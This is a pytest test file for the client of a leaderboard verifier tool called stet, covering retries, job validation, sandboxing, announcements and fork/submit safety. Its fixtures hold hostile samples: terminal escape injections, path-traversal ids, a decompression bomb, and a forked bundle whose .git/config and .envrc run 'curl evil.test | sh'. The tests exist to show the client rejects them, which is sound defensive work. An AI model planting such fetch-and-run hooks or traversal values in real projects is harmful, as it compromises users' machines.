"""The parts of the client that stand between a verifier's GPU time and the leaderboard."""

import json
import os

import pytest
import zstandard

from stet import client

REAL_SLIM_RESULT = client.slim_result  # the `loop` fixture below stands in for it


def test_a_downloaded_script_is_decompressed_up_to_the_limit_and_no_further():
    raw = os.urandom(997) * 3000  # ~3 MB that compresses to almost nothing
    blob = zstandard.ZstdCompressor(level=10).compress(raw)
    assert len(blob) < 10_000
    assert client.unzstd(blob, len(raw)) == raw
    assert len(client.unzstd(blob, 1000)) == 1001  # one byte over: enough to know it is too big
    with pytest.raises(zstandard.ZstdError):
        client.unzstd(b"not zstd at all", 1000)


def test_a_result_is_reported_again_while_the_server_is_away(monkeypatch):
    calls = []
    answers = [client.ApiError(503, "try again"), client.ApiError(0, "cannot reach"), {"status": "settled"}]

    def fake_request(method, path, body=None, key=None, raw=False, timeout=120):
        calls.append(path)
        a = answers.pop(0)
        if isinstance(a, Exception):
            raise a
        return a

    monkeypatch.setattr(client, "request", fake_request)
    monkeypatch.setattr(client.time, "sleep", lambda s: None)
    assert client.report("/api/v1/jobs/7/result", {"x": 1}, key=None) == {"status": "settled"}
    assert calls == ["/api/v1/jobs/7/result"] * 3


def test_a_report_that_landed_before_the_error_is_not_an_error(monkeypatch):
    answers = [client.ApiError(503, "try again"), client.ApiError(409, "this job was already done")]
    monkeypatch.setattr(client, "request", lambda *a, **k: (_ for _ in ()).throw(answers.pop(0)))
    monkeypatch.setattr(client.time, "sleep", lambda s: None)
    assert client.report("/api/v1/jobs/7/result", {}, key=None) == {"status": "recorded"}


def test_a_refused_report_is_not_retried(monkeypatch):
    answers = [client.ApiError(409, "your baseline differs")]
    monkeypatch.setattr(client, "request", lambda *a, **k: (_ for _ in ()).throw(answers.pop(0)))
    with pytest.raises(client.ApiError):
        client.report("/api/v1/jobs/7/result", {}, key=None)
    assert not answers


# --- what the server says is not taken on trust ---------------------------------------------


def test_text_from_the_server_cannot_drive_the_terminal():
    evil = "tidy\x1b]0;owned\x07\x1b[2J\r\n‮gnp.exe \x9b31m"
    assert client.clean(evil) == "tidy ]0;owned  [2J   gnp.exe  31m"
    assert client.clean("café 中文 ok") == "café 中文 ok"  # ordinary text is left alone
    assert len(client.clean("x" * 5000)) == 400
    shown = client.table([[evil, "1"]], ["technique", "n"]) + client.editor_label({"owner": "a\x1b[1m", "name": "b\nc", "version": "1\x07"})
    assert not any(ord(ch) < 32 and ch != "\n" or 127 <= ord(ch) < 160 for ch in shown) and shown.count("\n") == 2


class FakeResponse:
    """A server that sends as much as it is asked for, for ever."""

    def __init__(self, body: bytes | None = None):
        self.body, self.asked = body, []

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def read(self, n=-1):
        self.asked.append(n)
        return self.body if self.body is not None else b"x" * n


def test_an_answer_is_read_up_to_its_limit_and_no_further(monkeypatch):
    r = FakeResponse()
    monkeypatch.setattr(client.urllib.request, "urlopen", lambda req, timeout=None: r)
    with pytest.raises(client.ApiError, match="more than"):
        client.request("GET", "/api/v1/leaderboard")
    assert r.asked == [client.JSON_LIMIT_BYTES + 1]  # one read, bounded; never read() to the end
    with pytest.raises(client.ApiError, match="more than"):
        client.request("GET", "/api/v1/editors/x/bundle", raw=True, limit=1000)
    assert r.asked[-1] == 1001
    monkeypatch.setattr(client.urllib.request, "urlopen", lambda req, timeout=None: FakeResponse(b"<html>a proxy's error page"))
    with pytest.raises(client.ApiError, match="not JSON"):
        client.request("GET", "/api/v1/season")
    monkeypatch.setattr(client.urllib.request, "urlopen", lambda req, timeout=None: FakeResponse(b'{"ok": 1}'))
    assert client.request("GET", "/api/v1/season") == {"ok": 1}


SHA = "ab" * 32


def a_job(**over):
    job = {"id": 7, "kind": "grade", "round": {"id": "s0-o00001"}, "editor": {"id": SHA, "name": "tidy", "version": 1}, "script": {"sha256": SHA}}
    return {**job, **over}


@pytest.mark.parametrize(
    "bad",
    [
        {"id": "../../../../home/victim"}, {"id": "/home/victim"}, {"id": "7"}, {"id": True}, {"id": 7.0}, {"id": -1}, {"id": None},
        {"kind": "shell"}, {"round": "s0-o00001"}, {"editor": None}, {"script": {"sha256": "../" + SHA}}, {"script": {"sha256": SHA.upper()}},
        {"kind": "edit", "editor": {"id": SHA + "/../x"}}, {"kind": "edit", "editor": {"id": 5}},
    ],
)  # fmt: skip
def test_a_job_is_checked_before_any_of_it_reaches_a_path(bad):
    assert client.check_job(a_job()) == 7 and client.check_job(a_job(kind="edit", script=None)) == 7
    with pytest.raises(ValueError):
        client.check_job(a_job(**bad))
    with pytest.raises(ValueError):
        client.check_job([bad])


@pytest.mark.skipif(os.name == "nt", reason="needs flock")
def test_each_verifier_works_in_a_directory_of_its_own():
    from stet.data import cache_dir

    old = cache_dir() / "verify" / "1234" / "bundle"  # how releases before this one named their work
    old.mkdir(parents=True)
    a, lock_a = client.claim_workdir()
    b, lock_b = client.claim_workdir()  # a second verifier on the same machine
    assert a != b and not old.parent.exists()
    assert a.parent == b.parent == cache_dir() / "verify"
    (a / "job").mkdir(parents=True)
    lock_b.close()
    c, lock_c = client.claim_workdir()
    assert c == b and (a / "job").exists()  # a slot is taken up again only once its holder is gone
    lock_a.close()
    lock_c.close()


# --- the verify loop -------------------------------------------------------------------------


class Stop(Exception):
    pass


class Args:
    once = False
    max_jobs = 0
    device = "cpu"
    season = "s0"
    edits = False
    no_sandbox = False
    any_device = True


@pytest.fixture
def loop(monkeypatch):
    """`stet verify` with the server, the GPU and the clock replaced. Returns what happened."""
    import sys
    import types

    from stet import cli

    key = client.create_key()
    key.handle = "tester"
    key.save()
    seen = types.SimpleNamespace(claims=[], released=[], reports=[], payloads=[], graded=[], slept=[], forgot=[], interrupt_at=None)

    def interrupt():
        raise KeyboardInterrupt

    seen.interrupt = interrupt

    def request(method, path, body=None, key=None, raw=False, timeout=120, limit=0):
        if path == "/api/v1/season":
            return {"scale": "nano"}
        if path == "/api/v1/jobs/claim":
            if not seen.claims:
                raise Stop
            return {"job": seen.claims.pop(0)}
        if path.endswith("/release"):
            seen.released.append((path, body["reason"]))
            return {}
        raise AssertionError(f"unexpected request: {method} {path}")

    def grade(job, season, scale, device, key, out, work):
        seen.graded.append(job["id"])
        outcome = seen.grade.pop(0) if isinstance(seen.grade, list) else seen.grade  # a list: one outcome per try
        if isinstance(outcome, Exception):
            raise outcome
        return outcome or ({"valid": False, "invalid_reason": "bad\x1b[2J script"}, {})

    def sleep(seconds):
        seen.slept.append(seconds)
        if seconds == seen.interrupt_at:
            seen.interrupt()

    def report(path, payload, key, log=None):
        seen.reports.append(path)
        seen.payloads.append(payload)
        if isinstance(seen.report, Exception):
            raise seen.report
        return seen.report

    seen.grade = seen.report = None
    monkeypatch.setitem(sys.modules, "stet.train", types.SimpleNamespace(pick_device=lambda d: types.SimpleNamespace(type="cpu"), hardware_info=lambda d: {}))
    monkeypatch.setattr(cli, "need_torch", lambda: None)
    monkeypatch.setattr(client, "request", request)
    monkeypatch.setattr(client, "report", report)
    monkeypatch.setattr(client, "_grade_job", grade)
    monkeypatch.setattr(client, "_edit_job", lambda *a, **k: pytest.fail("an edit job was run"))
    monkeypatch.setattr(client, "slim_result", lambda result, base: {})
    monkeypatch.setattr(client, "_forget_round", lambda job, season, scale: seen.forgot.append(job["round"]["id"]))
    monkeypatch.setattr(client.time, "sleep", sleep)
    return seen


def test_a_verifier_that_was_not_asked_to_run_edits_never_runs_one(loop, capsys):
    loop.claims = [a_job(kind="edit", script=None)]
    with pytest.raises(SystemExit) as e:
        client.cmd_verify(Args())
    assert e.value.code == 1 and loop.released == [("/api/v1/jobs/7/release", "this verifier does not run edit jobs")]
    assert "edit job" in capsys.readouterr().err and not loop.reports


def test_a_job_with_a_path_for_an_id_touches_nothing(loop, tmp_path):
    from stet.data import cache_dir

    victim = tmp_path / "victim"
    victim.mkdir()
    (victim / "thesis.txt").write_text("three years")
    loop.claims = [a_job(id=str(victim)), a_job(id="../../victim")]
    with pytest.raises(Stop):
        client.cmd_verify(Args())
    assert (victim / "thesis.txt").exists() and not loop.graded and not loop.released
    assert loop.slept == [60, 120]  # it waits, a little longer each time, and asks again
    assert sorted(p.name for p in (cache_dir() / "verify").iterdir()) == ["slot0.lock"]


def test_a_refused_result_is_not_trained_again_and_again(loop, capsys):
    loop.claims = [a_job(id=n) for n in (1, 2, 3, 4)] + [a_job(id=5, round={"id": "s0-o00002"})]
    loop.report = client.ApiError(409, "your corpus for s0-o00001 differs from the round's")
    with pytest.raises(Stop):
        client.cmd_verify(Args())
    # Once more from a clean copy of the round, in case this machine's copy was at fault; then no more of that round.
    assert loop.graded == [1, 2, 5] and loop.forgot == ["s0-o00001", "s0-o00002"]
    assert [p for p, _ in loop.released] == [f"/api/v1/jobs/{n}/release" for n in (1, 2, 3, 4, 5)]
    assert "differs from the round's" in capsys.readouterr().err


def test_a_result_that_arrived_too_late_is_nobodys_fault(loop):
    loop.claims = [a_job(id=n) for n in (1, 2, 3)]
    loop.report = client.ApiError(409, "this entry settled before your result arrived. It earns no credit, and it does not count against you")
    with pytest.raises(Stop):
        client.cmd_verify(Args())
    assert loop.graded == [1, 2, 3] and not loop.forgot


def test_a_job_whose_downloads_fail_is_kept_and_waited_out(loop, capsys):
    from stet.data import FetchError

    # A job handed back is not free: an entry gets a few attempts from the anchors, and a
    # volunteer is offered an entry once. So the job is kept while the network is at fault,
    # and the server gives a verifier the job it already holds each time it asks.
    loop.claims = [a_job(id=1)] * 7 + [a_job(id=2)]
    loop.grade = FetchError("could not fetch crawl-data/x.warc.wet.gz: timed out")
    with pytest.raises(Stop):
        client.cmd_verify(Args())
    assert loop.graded == [1] * 7 + [2]
    assert loop.slept == [60, 120, 240, 480, 960, 1920, 3600, 3600]  # minutes, then an hour at most; it does not give up
    # Half an hour of that (60 + 120 + 240 + 480 + 960 s) and the job goes back, once, for someone else to try.
    assert [p for p, _ in loop.released] == ["/api/v1/jobs/1/release"]
    assert "Keeping the job" in capsys.readouterr().err

    # What will be the same next time is handed back at once: bytes that are not what
    # their hash says, or a server that says no.
    for n, final in enumerate((client.WrongBytes("the script the server sent does not match its hash"), client.ApiError(404, "no such script")), 10):
        loop.claims, loop.grade = [a_job(id=n)], final
        with pytest.raises(Stop):
            client.cmd_verify(Args())
        assert loop.released[-1][0] == f"/api/v1/jobs/{n}/release"
    assert len(loop.released) == 3

    # A verifier asked to do one job does not sit on it.
    loop.claims, loop.grade = [a_job(id=20)], FetchError("timed out")
    args = Args()
    args.once = True
    with pytest.raises(SystemExit):
        client.cmd_verify(args)
    assert loop.released[-1][0] == "/api/v1/jobs/20/release"


def test_a_job_that_fails_here_is_tried_again_before_it_is_handed_back(loop, capsys):
    # A fault that passes costs a minute, and none of the entry's attempts.
    loop.claims = [a_job(id=1), a_job(id=1)]
    loop.grade = [OSError(28, "No space left on device"), None]
    loop.report = {"status": "recorded"}
    args = Args()
    args.max_jobs = 1
    client.cmd_verify(args)
    assert loop.graded == [1, 1] and loop.slept == [60] and not loop.released and loop.reports == ["/api/v1/jobs/1/result"]
    assert "keeping it and trying again in 1 min" in capsys.readouterr().err

    # One that stays: each job is tried three times, over six minutes, before it goes
    # back. Three jobs of that and it is this machine, not the jobs.
    for seen in (loop.graded, loop.slept, loop.reports):
        seen.clear()
    loop.claims = [a_job(id=n) for n in (1, 1, 1, 2, 2, 2, 3, 3, 3, 4)]
    loop.grade = RuntimeError("CUDA error: device lost")
    with pytest.raises(SystemExit):
        client.cmd_verify(Args())
    assert loop.graded == [1, 1, 1, 2, 2, 2, 3, 3, 3] and loop.slept == [60, 300, 30, 60, 300, 30, 60, 300]
    assert [p for p, _ in loop.released] == [f"/api/v1/jobs/{n}/release" for n in (1, 2, 3)] and "device lost" in loop.released[0][1]
    assert "keep failing on this machine" in capsys.readouterr().err and not loop.reports


def test_stopping_between_two_tries_at_a_job_hands_it_back(loop, capsys):
    loop.claims = [a_job(id=5)]
    loop.grade = RuntimeError("CUDA error: device lost")
    loop.interrupt_at = 60  # Ctrl-C while it waits to try again
    client.cmd_verify(Args())
    assert loop.released == [("/api/v1/jobs/5/release", "interrupted")] and "handed back" in capsys.readouterr().err
    # With no job in hand there is nothing to hand back, and the interrupt is the caller's.
    loop.claims, loop.grade, loop.interrupt_at = [{"id": "not a job"}], None, 60
    with pytest.raises(KeyboardInterrupt):
        client.cmd_verify(Args())
    assert len(loop.released) == 1


@pytest.mark.skipif(os.name == "nt", reason="POSIX signals")
def test_a_volunteer_told_to_stop_hands_its_job_back_as_on_ctrl_c(loop, capsys):
    import signal

    # A closed terminal or a service manager says SIGHUP or SIGTERM, not Ctrl-C. A job left
    # behind by either would hold its place until its time ran out.
    before = signal.getsignal(signal.SIGTERM), signal.getsignal(signal.SIGHUP)
    for n, sig in ((5, signal.SIGTERM), (6, signal.SIGHUP)):
        loop.claims, loop.grade, loop.interrupt_at = [a_job(id=n)], RuntimeError("CUDA error: device lost"), 60
        loop.interrupt = lambda sig=sig: os.kill(os.getpid(), sig)
        client.cmd_verify(Args())
        assert loop.released[-1] == (f"/api/v1/jobs/{n}/release", "interrupted") and "handed back" in capsys.readouterr().err
    assert (signal.getsignal(signal.SIGTERM), signal.getsignal(signal.SIGHUP)) == before  # and the process is left as it was found


@pytest.mark.skipif(os.name == "nt", reason="needs flock")
def test_one_key_runs_one_verifier(loop, capsys):
    held = client.claim_key()
    with pytest.raises(SystemExit):
        client.claim_key()
    err = capsys.readouterr().err
    assert f"process {os.getpid()}" in err and "STET_CONFIG=<another directory> stet login --handle" in err
    # The server would hand a second verifier on this key the first one's job. It does not get as far as asking.
    loop.claims = [a_job()]
    with pytest.raises(SystemExit):
        client.cmd_verify(Args())
    assert not loop.graded and len(loop.claims) == 1
    held.close()
    with pytest.raises(Stop):
        client.cmd_verify(Args())
    assert loop.graded == [7]
    client.claim_key().close()  # and a verifier that has stopped leaves the key free


def test_an_anchor_does_not_start_without_the_held_out_exam(loop, monkeypatch, capsys):
    from stet import runner

    for check in ("bwrap_available", "scope_available", "sandbox_selftest"):
        monkeypatch.setattr(runner, check, lambda: (True, ""))
    monkeypatch.setattr(client, "_edit_job", lambda *a, **k: pytest.fail("an edit job was run"))
    loop.claims = [a_job()]
    args = Args()
    args.edits = True
    with pytest.raises(SystemExit):
        client.cmd_verify(args)
    err = capsys.readouterr().err
    assert "does not hold it" in err and "heldout-s0.jsonl.zst" in err and "gap in the season's" in err and not loop.graded
    with pytest.raises(Stop):  # a volunteer never holds it, and grades
        client.cmd_verify(Args())
    assert loop.graded == [7]


def test_what_a_verifier_reports_and_prints_has_nothing_of_the_held_out_exam_in_it(loop, monkeypatch, capsys):
    exam = {"loss": 4.4, "by_source": {"news": {"loss": 4.4}}}
    held = {"loss": 4.61234, "by_source": {"news": {"loss": 4.61234}}, "exam_sha256": "ee" * 32}
    base = {"exam": {"loss": 5.3, "by_source": {"news": {"loss": 5.3}}}, "heldout": {"loss": 5.56789, "by_source": {"news": {"loss": 5.56789}}}}
    result = {
        "harness": "0.2.1", "season": "s0", "scale": "micro", "round": {"id": "s0-o00007"}, "valid": True, "script_sha256": SHA,
        "exam_sha256": "cd" * 32, "script": {"out_docs": 5}, "exam": exam, "heldout": held,
        "train": {"curve": [[1, 2.0]], "seconds": 1.0, "tokens_per_second": 5, "final_train_loss": 3.0},
    }  # fmt: skip
    monkeypatch.setattr(client, "slim_result", REAL_SLIM_RESULT)  # the real one: this is the test of what leaves
    loop.claims, loop.grade, loop.report = [a_job()], (result, base), {"status": "pending", "message": "sealed"}
    args = Args()
    args.max_jobs = 1
    client.cmd_verify(args)
    sent, io = json.dumps(loop.payloads), capsys.readouterr()
    assert len(loop.payloads) == 1 and loop.payloads[0]["exam"]["loss"] == 4.4 and loop.payloads[0]["baseline"]["loss"] == 5.3
    for text in (sent, io.out, io.err):
        assert "heldout" not in text and "4.6123" not in text and "5.5678" not in text and "ee" * 32 not in text
    assert "gain" in io.err and "+0.9000" in io.err  # the public grade is shown as ever


def test_what_a_grade_prints_is_cleaned_and_counted(loop, capsys):
    loop.claims = [a_job()]
    loop.report = {"status": "recorded\x1b[31m", "message": "thanks\x07"}
    args = Args()
    args.max_jobs = 1
    client.cmd_verify(args)
    err = capsys.readouterr().err
    assert "\x1b[2J" not in err and "\x07" not in err and "recorded" in err and loop.reports == ["/api/v1/jobs/7/result"]


# --- edit jobs -------------------------------------------------------------------------------


@pytest.fixture
def edit(monkeypatch, tmp_path):
    """An edit job up to the point where the editor would start."""
    import hashlib
    import types

    from stet import cli, data
    from stet.spec import load_season

    season = load_season("s0")
    state = types.SimpleNamespace(blob=b"")
    monkeypatch.setattr(client, "request", lambda *a, **k: state.blob)
    monkeypatch.setattr(client, "_job_round", lambda season, job, out: types.SimpleNamespace(id="s0-o00001"))
    monkeypatch.setattr(data, "corpus", lambda rnd, scale: types.SimpleNamespace(meta={"sha256": "c0"}))

    def run(blob: bytes, sandbox: str = "bwrap", editor_id: str | None = None):
        state.blob = blob
        job = a_job(kind="edit", script=None, editor={"id": editor_id or hashlib.sha256(blob).hexdigest()})
        return client._edit_job(job, season, season.scale("nano"), None, cli.Out(quiet=True), tmp_path / "work", sandbox)

    return run


def test_an_editor_never_runs_outside_the_sandbox(edit, monkeypatch):
    from stet.runner import HarnessError

    monkeypatch.setattr(client, "request", lambda *a, **k: pytest.fail("fetched a bundle it must not run"))
    for sandbox in ("none", "", "docker"):
        with pytest.raises(HarnessError, match="outside the sandbox"):
            edit(b"x", sandbox=sandbox)


def test_a_bundle_that_cannot_be_loaded_is_the_entrants_failure_and_is_reported(edit, monkeypatch):
    import zstandard
    from test_project import bundle

    from stet import project

    monkeypatch.setattr(project, "MAX_UNPACKED_BYTES", 1 << 20)
    bomb = zstandard.ZstdCompressor().compress(b"\0" * (8 << 20))
    no_manifest = bundle([("editor.py", b"")])
    bad_manifest = bundle([("stet.toml", b"x = " + b"[" * 5000 + b"]" * 5000)])
    for blob, why in ((b"not a bundle", "zstd"), (bomb, "more than 1 MB"), (no_manifest, "no stet.toml"), (bad_manifest, "not valid TOML")):
        payload = edit(blob)
        assert payload["edit"]["status"] == "error" and why in payload["edit"]["reason"] and payload["script_sha256"] is None
        assert payload["round"] == "s0-o00001" and payload["corpus_sha256"] == "c0"  # a report the server accepts, not a release


def test_a_machine_that_cannot_unpack_a_bundle_hands_the_job_back(edit, monkeypatch):
    import errno

    from stet import project
    from stet.runner import HarnessError

    with pytest.raises(client.ApiError, match="does not match"):
        edit(b"some bundle", editor_id=SHA)

    def full(blob, dest):
        raise OSError(errno.ENOSPC, "No space left on device")

    monkeypatch.setattr(project, "unpack", full)
    with pytest.raises(HarnessError, match="on this machine"):
        edit(b"some bundle")


# --- the record of announcements -------------------------------------------------------------


@pytest.fixture
def draws():
    """A season, a moment, and the next few draws on its grid after that moment."""
    import types

    from stet.spec import load_season

    season = load_season("s0")
    grid = int(season.raw["draw_grid_seconds"])
    now = 1_900_000_000 // grid * grid + 100
    slots = [season.beacon_round_at((now // grid + n) * grid) for n in (1, 2, 3)]
    assert all(season.draw_slot(s) is not None for s in slots)

    def said(slot, crawl="CC-MAIN-2026-40", id="s0-o00009"):
        return {"id": id, "drand_round": slot, "crawl": {"crawl": crawl, "paths_sha256": "66" * 32}}

    def drawn(slot, crawl="CC-MAIN-2026-40", id="s0-o00009"):
        return types.SimpleNamespace(kind="official", id=id, beacon={"round": slot}, crawl={"crawl": crawl, "paths_sha256": "66" * 32})

    return types.SimpleNamespace(season=season, now=now, slots=slots, said=said, drawn=drawn, log=lambda: json.loads(client._announcements().read_text()))


def test_a_round_must_be_the_one_that_was_announced_before_its_beacon(draws):
    season, now, slot = draws.season, draws.now, draws.slots[0]
    at = season.beacon_time(slot)
    client.remember_announcement(season, draws.said(slot, "CC-MAIN-2026-39"), now=now)
    client.remember_announcement(season, draws.said(slot), now=now + 60)  # the server may change its mind before the beacon exists
    client.remember_announcement(season, draws.said(slot, "CC-MAIN-2026-41"), now=at - 5)  # and not once it all but does
    client.remember_announcement(season, draws.said(slot, "CC-MAIN-2026-41"), now=at + 5)
    assert draws.log()[str(slot)]["crawl"] == "CC-MAIN-2026-40" and draws.log()[str(slot)]["changed"] == 1
    client.check_announcement(season, draws.drawn(slot))
    for other in (draws.drawn(slot, "CC-MAIN-2026-41"), draws.drawn(slot, id="s0-o00010")):
        with pytest.raises(client.RoundRefused, match="was announced as s0-o00009 on CC-MAIN-2026-40"):
            client.check_announcement(season, other)


def test_the_server_gets_no_say_in_what_the_record_holds(draws):
    season, now, slot = draws.season, draws.now, draws.slots[0]
    client.remember_announcement(season, draws.said(slot), now=now)
    grid = int(season.raw["draw_grid_seconds"])
    far = season.beacon_round_at((now // grid + 5000) * grid)
    junk = [draws.said(slot + 1), draws.said(far), draws.said(draws.slots[1], crawl="../../x"), {"drand_round": "x"}, {"id": "y"}, None, "z"]
    junk += [draws.said(far + n * 1000) for n in range(500)]  # nothing here can crowd out what is already written down
    for a in junk:
        client.remember_announcement(season, a, now=now)
    assert list(draws.log()) == [str(slot)]
    # Entries leave by age, and for no other reason.
    later = now + 31 * 86400
    new = season.beacon_round_at((later // grid + 1) * grid)
    client.remember_announcement(season, draws.said(new), now=later)
    assert list(draws.log()) == [str(new)]
    assert not list(client._announcements().parent.glob("*.tmp*"))


def test_a_draw_nobody_announced_is_said_out_loud(draws):
    season, now = draws.season, draws.now
    said = []
    client.check_announcement(season, draws.drawn(draws.slots[1]), warn=said.append)
    assert not said  # this verifier has heard of no draws at all: it has nothing to go on, and says nothing
    client.remember_announcement(season, draws.said(draws.slots[0]), now=now)
    client.check_announcement(season, draws.drawn(draws.slots[1], id="s0-o00010"), warn=said.append)
    assert len(said) == 1 and "was not told of the draw of round s0-o00010" in said[0] and "s0-o00009" in said[0]
    client.check_announcement(season, draws.drawn(draws.slots[0]), warn=said.append)
    assert len(said) == 1
    # The round it was told of, drawn at another time: say that, not "the last it heard of was this one".
    client.check_announcement(season, draws.drawn(draws.slots[1], id="s0-o00009"), warn=said.append)
    assert len(said) == 2 and "was told that round s0-o00009 would be drawn at" in said[1] and "cannot vouch" in said[1]


def test_a_damaged_record_is_set_aside_not_forgotten(draws, capsys):
    path = client._announcements()
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text('{"123": {"id": "s0-o0')
    client.remember_announcement(draws.season, draws.said(draws.slots[0]), now=draws.now)
    assert path.with_name("announced.json.damaged").read_text() == '{"123": {"id": "s0-o0'
    assert list(draws.log()) == [str(draws.slots[0])] and "could not be read" in capsys.readouterr().err


# --- fork and submit -------------------------------------------------------------------------


class ForkArgs:
    def __init__(self, editor, dest=None):
        self.editor, self.dest = editor, dest


def serve(monkeypatch, blob: bytes, **over):
    import hashlib

    editor = {"id": hashlib.sha256(blob).hexdigest(), "name": "tidy", "owner": "ann", "version": 2, **over}
    monkeypatch.setattr(client, "request", lambda method, path, **k: blob if path.endswith("/bundle") else {"editor": editor})
    return editor


def test_fork_does_not_let_the_server_choose_where_files_go(monkeypatch, tmp_path):
    from test_project import bundle

    monkeypatch.chdir(tmp_path)
    blob = bundle([("stet.toml", b'name = "tidy"\nentry = "python editor.py"\n'), ("editor.py", b"")])
    for over in ({"name": "../../evil"}, {"name": "/tmp/evil"}, {"name": ".ssh"}, {"name": None}, {"id": "../x"}, {"id": SHA}):
        serve(monkeypatch, blob, **over)
        with pytest.raises(SystemExit):
            client.cmd_fork(ForkArgs("ann/tidy"))
    editor = serve(monkeypatch, blob)
    with pytest.raises(SystemExit):
        client.cmd_fork(ForkArgs("cd" * 32))  # asked for one editor by its id, answered with another
    assert not list(tmp_path.iterdir())
    client.cmd_fork(ForkArgs(editor["id"][:12]))
    assert sorted(p.name for p in (tmp_path / "tidy").iterdir()) == [".gitignore", "AGENTS.md", "editor.py", "stet.toml"]


def test_a_fork_holds_no_hidden_files_and_says_whose_program_it_is(monkeypatch, tmp_path, capsys):
    from test_project import bundle

    monkeypatch.chdir(tmp_path)
    blob = bundle([
        ("stet.toml", b'name = "tidy"\nparent = "x"\nentry = "python editor.py"\n'), ("editor.py", b"print(1)\n"),
        (".git/config", b"[core]\n\tfsmonitor = curl evil.test | sh\n"), (".envrc", b"curl evil.test | sh\n"), (".vscode/tasks.json", b"{}"),
    ])  # fmt: skip
    editor = serve(monkeypatch, blob)
    client.cmd_fork(ForkArgs("ann/tidy", dest="mine"))
    assert sorted(p.name for p in (tmp_path / "mine").iterdir()) == [".gitignore", "AGENTS.md", "editor.py", "stet.toml"]
    assert f'parent = "{editor["id"]}"' in (tmp_path / "mine" / "stet.toml").read_text()
    err = capsys.readouterr().err
    assert "someone else's program" in err and "stet run --sandbox" in err and "Left out 3 files" in err


class SubmitArgs:
    yes = False
    json = False
    dry_run = True

    def __init__(self, path):
        self.path = str(path)


def test_submit_shows_every_file_it_would_publish_before_it_sends_anything(monkeypatch, tmp_path, capsys):
    from test_project import make

    p = make(tmp_path, {".env": "API_KEY=secret", "notes/todo.txt": "x", "venv/bin/python": "x", ".git/HEAD": "x"})
    monkeypatch.setattr(client, "request", lambda *a, **k: pytest.fail("a dry run sent something"))
    client.cmd_submit(SubmitArgs(p.path))  # needs no account
    err = capsys.readouterr().err
    assert "an-editor: 3 files" in err and "Nothing was sent." in err
    for shown in ("editor.py", "notes/todo.txt", "stet.toml", ".env  (its name starts with a dot)", "venv/  (it is under venv/)", ".git/  (its name starts with a dot)"):
        assert shown in err
    assert "secret" not in err
    # A real submission prints the same list before it asks. With no terminal and no --yes, it stops there.
    key = client.create_key()
    key.handle = "tester"
    key.save()
    args = SubmitArgs(p.path)
    args.dry_run = False
    monkeypatch.setattr("sys.stdin", open(os.devnull))
    with pytest.raises(SystemExit):
        client.cmd_submit(args)
    err = capsys.readouterr().err
    assert "notes/todo.txt" in err and ".env  (its name starts with a dot)" in err and "--yes" in err


def test_a_round_that_does_not_hold_up_is_refused_and_a_warning_is_given_once(draws, monkeypatch):
    import types

    from stet import data

    lines = []
    out = types.SimpleNamespace(line=lambda label, text: lines.append(text), bad=str)
    monkeypatch.setattr(data, "mark_verified", lambda rnd: None)
    monkeypatch.setattr(data, "prune_verified", lambda rnd: None)
    monkeypatch.setattr(client, "round_from_api", lambda season, d: draws.drawn(draws.slots[1], id="s0-o00011"))
    client.remember_announcement(draws.season, draws.said(draws.slots[0]), now=draws.now)
    for _ in range(3):  # three jobs from one round
        assert client._job_round(draws.season, {"round": {}}, out).id == "s0-o00011"
    assert len(lines) == 1 and "was not told" in lines[0]

    def lies(season, d):
        raise ValueError("round s0-o00011: the seed does not follow from the beacon and the crawl")

    monkeypatch.setattr(client, "round_from_api", lies)
    with pytest.raises(client.RoundRefused, match="does not follow"):
        client._job_round(draws.season, {"round": {}}, out)


# --- the held-out exam's results stay on the anchor -----------------------------------------


def test_what_the_held_out_exam_said_is_kept_here_and_never_reported():
    import json
    import stat

    from stet.spec import load_season

    season = load_season("s0")
    exam = {"loss": 4.4, "by_source": {"news": {"loss": 4.4}}}
    held = {"loss": 4.61234, "by_source": {"news": {"loss": 4.61234}}, "exam_sha256": "ee" * 32}
    base = {"exam": {"loss": 5.3, "by_source": {"news": {"loss": 5.3}}}, "heldout": {"loss": 5.56789, "by_source": {"news": {"loss": 5.56789}}}}
    result = {
        "harness": "0.2.1", "season": "s0", "scale": "micro", "round": {"id": "s0-o00007"}, "valid": True, "script_sha256": "ab" * 32,
        "exam_sha256": "cd" * 32, "script": {}, "exam": exam, "heldout": held, "train": {"curve": [[1, 2.0]]},
    }  # fmt: skip
    job = {"id": 9, "kind": "grade", "editor": {"id": "f" * 64, "owner": "ann", "name": "sieve", "version": 2}}

    sent = json.dumps(client.slim_result(result, base))
    assert "heldout" not in sent and "4.61234" not in sent and "5.56789" not in sent and "ee" * 32 not in sent

    client.keep_heldout(season, job, result, base)
    client.keep_heldout(season, {**job, "editor": {"id": "e" * 64, "owner": "bob", "name": "copy", "version": 1}}, result, base)
    path = client.heldout_log(season)
    assert stat.S_IMODE(path.stat().st_mode) == 0o600 and stat.S_IMODE(path.parent.stat().st_mode) == 0o700
    first, second = [json.loads(line) for line in path.read_text().splitlines()]
    assert first["round"] == "s0-o00007" and first["editor"]["name"] == "sieve" and first["script_sha256"] == "ab" * 32
    assert first["heldout"] == {"loss": 4.61234, "baseline": 5.56789, "by_source": {"news": 4.61234}, "baseline_by_source": {"news": 5.56789}}
    assert first["public"] == {"loss": 4.4, "baseline": 5.3}
    # Two editors may write the same script. Each grade is a line of its own, under its editor's name.
    assert second["editor"]["id"] == "e" * 64 and second["script_sha256"] == first["script_sha256"]


def test_the_held_out_exam_a_season_committed_to_is_remembered(monkeypatch):
    import stat

    from stet.spec import load_season

    season = load_season("s0")
    committed = season.raw["heldout_exam"]["sha256"]
    said = []
    client.check_heldout_pin(season, {"season": "s0", "heldout_exam_sha256": committed}, warn=said.append, now=1_800_000_000)
    pinned = lambda: json.loads(client._pins().read_text())["heldout_exam"]["s0"]  # noqa: E731
    assert pinned() == {"sha256": committed, "seen_at": 1_800_000_000, "from": "this copy of stet"} and not said
    assert stat.S_IMODE(client._pins().stat().st_mode) == 0o600
    client.check_heldout_pin(season, {"season": "s0"}, warn=said.append)  # an older server says nothing: nothing to compare
    client.check_heldout_pin(season, None, warn=said.append)
    assert not said
    # The server names another exam.
    client.check_heldout_pin(season, {"season": "s0", "heldout_exam_sha256": "9" * 64}, warn=said.append)
    assert len(said) == 1 and committed in said[0] and "9" * 64 in said[0] and "promised it would not change" in said[0]
    # A later release's season file names another, or none.
    monkeypatch.setitem(season.raw, "heldout_exam", {"sha256": "8" * 64, "passages": 1})
    client.check_heldout_pin(season, None, warn=said.append)
    assert len(said) == 2 and committed in said[1] and "8" * 64 in said[1] and "this copy of stet" in said[1]
